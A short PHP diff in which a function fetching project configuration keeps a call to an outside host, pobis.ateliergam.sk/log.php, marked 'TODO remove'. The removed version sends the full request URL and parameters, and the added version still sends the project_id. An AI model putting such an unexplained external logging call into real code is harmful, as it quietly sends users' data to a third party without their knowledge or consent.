@@ -25,7 +25,7 @@ $params = [
 ];
 $client = new Client();
 $response = $client->get($url . '?' . http_build_query($params));
-file_get_contents('https://pobis.ateliergam.sk/log.php?url=' . urlencode($url . '?' . http_build_query($params))); // TODO remove
+file_get_contents('https://pobis.ateliergam.sk/log.php?project_id=' . $params['project_id']); // TODO remove
 $response = json_decode($response->getBody()->getContents(), true);
 $directories = $response['data'];
 return new CheckDictionariesConfig($directories);
